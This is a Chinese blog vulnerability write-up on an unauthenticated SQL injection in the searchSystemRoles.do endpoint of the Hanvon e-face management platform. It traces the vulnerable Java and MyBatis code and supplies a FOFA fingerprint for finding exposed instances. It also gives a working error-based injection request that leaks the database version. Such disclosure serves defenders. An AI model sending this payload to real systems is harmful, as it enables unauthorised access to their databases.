---
title: "汉王e脸通综合管理平台 searchSystemRoles.do SQL注入漏洞"
source: https://mrxn.net/jswz/hanvon-efacego-searchSystemRoles-sqli.html
asset_dir: assets/汉王e脸通综合管理平台-searchsystemroles.do-sql注入漏洞
---

# 汉王e脸通综合管理平台 searchSystemRoles.do SQL注入漏洞

[Mrxn](https://mrxn.net/author/1)- 发表于2025/7/29 08:25
- 794浏览
- [0评论](#comment)
- 57分钟阅读

深入探索

SQL

认证

鉴权

---

# 漏洞简介

汉王e脸通综合管理平台是汉王公司研发的一款基于生物识别技术的智慧园区管理[软件](#)，集成了考勤管理、门禁管理、访客管理、巡更管理、消费管理、车控管理、梯控管理、人事管理等多个模块，广泛应用于政府、企业、监狱、学校、智慧社区等多个领域，实现无接触式快速通行，提升管理效率和安全性。其管理平台的 `searchSystemRoles.do` 接口存在 [SQL注入漏洞](https://mrxn.net/tag/SQL%E6%B3%A8%E5%85%A5)。攻击者可在无需认证的情况下，通过构造恶意请求参数注入恶意 SQL 语句，导致数据库信息泄露、数据篡改甚至系统权限提升，影响系统数据安全和完整性。

SQL注入防护

# 影响版本

V1.6.x

# fofa语法

> icon\_hash="1380907357"

# 漏洞分析

直接看 `SystemRoleMgrController` 里关于 `searchSystemRoles` 的实现

```
@ResponseBody
    @RequestMapping(
        value = {"/searchSystemRoles.do"},
        method = {RequestMethod.GET}
    )
    public RequestJson searchSystemRoles(@RequestParam(required = false,value = "page") Integer page, @RequestParam(required = false,value = "pageSize") Integer pageSize, @RequestParam(required = false,value = "name") String roleName, @RequestParam(required = false,value = "columnKey") String columnKey, @RequestParam(required = false,value = "order") String order) {
        RequestJson result = new RequestJson();

        try {
            this.loginCheck();
            DbPager pager = this.getPager(page, pageSize, columnKey, order);
            SystemRoleTpm systemRole = new SystemRoleTpm();
            systemRole.setName(roleName);
            List<SystemRoleTpm> systemRoleTpms = this.querySystemRoles(systemRole, pager);
            int numRows = pager.getRecordCount();
```

深入探索

文件大小转换

编码转换工具

企业安全咨询

跟进`querySystemRoles`方法

```
private List<SystemRoleTpm> querySystemRoles(SystemRoleTpm sysRole, DbPager pager) throws Exception {
        if (sysRole == null) {
            sysRole = new SystemRoleTpm();
        } else if (Utils.isEmpty(sysRole.getName(), true)) {
            sysRole.setName((String)null);
        }

        SessionalUser su = getSessionUser();
        Long currUserId = su.isAdmin() ? null : su.getId();
        List<SystemRoleTpm> systemRoleTpms = new ArrayList();
        if (pager == null) {
            List<SystemRoleTpm> tpms = (List)this.systemAsm.getSystemRoles(sysRole.getName(), currUserId, pager).getResult();
            if (tpms != null) {
                systemRoleTpms.addAll(tpms);
            }
        } else {
            List<SystemRoleTpm> tpms = (List)this.systemAsm.getSystemRoles(sysRole.getName(), currUserId, pager).getResult();
            if (tpms != null) {
                systemRoleTpms.addAll(tpms);
            }
        }

        return systemRoleTpms;
    }
```

继续跟进`getSystemRoles`方法

```
public List<SystemRoleTpm> getSystemRoles(String roleName, Long userId, DbPager pager) throws Exception {
        if (pager != null) {
            for(DbSort dbSort : pager.getDbSorts()) {
                String f = SystemRoleFieldConvert.getFieldName(dbSort.getSortField());
                if (null == f || f.equals("")) {
                    throw new Exception("不支持的排序属性：" + dbSort.getSortField());
                }

                dbSort.setSortField(f);
            }
        }

        int recordCount = 0;
        List<SystemRoleTpm> roles;
        if (userId != null && this.systemDsm.getAdminUserCount(userId) <= 0) {
            if (!this.fillUserRoleIdTable(userId, roleName)) {
                pager.setRecordCount(0);
                return null;
            }

            if (pager != null) {
                recordCount = this.systemDsm.getSystemRolesCount(roleName, userId);
                pager.setRecordCount(recordCount);
            }

            roles = this.systemDsm.getSystemRoles(roleName, userId, pager);
            this.dropUserRoleIdTable();
        } else {
            if (pager != null) {
                recordCount = this.systemDsm.getAllSystemRolesCount(roleName);
                pager.setRecordCount(recordCount);
            }

            roles = this.systemDsm.getAllSystemRoles(roleName, pager);
        }
```

和 [汉王e脸通综合管理平台 queryManyPeopleGroupList.do SQL注入漏洞](https://mrxn.net/jswz/hanvon-efacego-queryManyPeopleGroupList-sqli.html) 处理逻辑差不多，直接看对应的 mapper xml文件 SystemDsm.xml

代码安全审计

```
<!--分页查询-->
    <select id="getSystemRoles" resultMap="systemRoleNoCollection">
        <include refid="select_page_head"/>
        <include refid="select_system_role"/>
        inner join tmpUserRole t on t.id=s.ng_id
        <!--<where>-->
            <!--<if test="roleName != null">-->
                <!--s.sz_name LIKE CONCAT(CONCAT('%',#{roleName}),'%')-->
            <!--</if>-->
        <!--</where>-->
        <include refid="select_page_tail"/>
    </select>
    <sql id="select_page_head">
        <if test="pager != null">
        SELECT * FROM (
        </if>
    </sql>
    <sql id="select_system_role">
        SELECT DISTINCT s.ng_id, s.sz_name
        FROM sys_role AS s
    </sql>
    <sql id="select_page_tail">
        <if test="pager != null">
        ) p
        <choose>
            <when test="pager.dbSorts != null and pager.dbSorts.size()>0">
                <foreach item="item" collection="pager.dbSorts" open="order by " separator=",">
                    ${item.sortField} ${item.sortMode}
                </foreach>
            </when>
            <otherwise>
                ORDER BY ng_id ASC
            </otherwise>
        </choose>
        limit ${(pager.pageIndex - 1) * pager.pageSize} , ${pager.pageSize}
        </if>
    </sql>
```

用户可控的 `columnKey` 和 `order` 参数未经任何过滤直接拼接到 SQL 语句的 `ORDER BY` 子句中，导致攻击者可构造恶意输入执行任意 SQL 命令，造成[SQL注入漏洞](https://mrxn.net/tag/SQL%E6%B3%A8%E5%85%A5)。

# 漏洞复现

```
GET /manage/systemRoleMgr/searchSystemRoles.do?branchId=1&columnKey=id&deviceName=test&id=1&order=OR+EXTRACTVALUE(2605,CONCAT(0x5c,@@version,0x5c,(SELECT+(ELT(2605=2605,1)))))&page=1&pageSize=10&pointName=1&recoToken=SGUsqvF7cVS HTTP/1.1
Host: hanvon.mrxn.net
```

[![汉王e脸通综合管理平台 searchSystemRoles.do SQL注入漏洞](images/img-001-b3275b5bdb3e.webp)](https://image.mrxn.net/ddee2766a9084a44ad1ecc1a385b94f8.webp)

成功利用报错注入获取到数据库版本号信息

漏洞扫描服务

- 标签：
- [#漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E)
- [#web安全](https://mrxn.net/tag/web%E5%AE%89%E5%85%A8)
- [#SQL注入](https://mrxn.net/tag/SQL%E6%B3%A8%E5%85%A5)
- [#代码审计](https://mrxn.net/tag/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1)
- [#Java](https://mrxn.net/tag/Java)
- [#0day](https://mrxn.net/tag/0day)

---

文章目录

- [1.漏洞简介](#toc-1-)
- [2.影响版本](#toc-2-)
- [3.fofa语法](#toc-3-)
- [4.漏洞分析](#toc-4-)
- [5.漏洞复现](#toc-5-)

  
  

![](data:image/png;base64,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)

手机扫码阅读
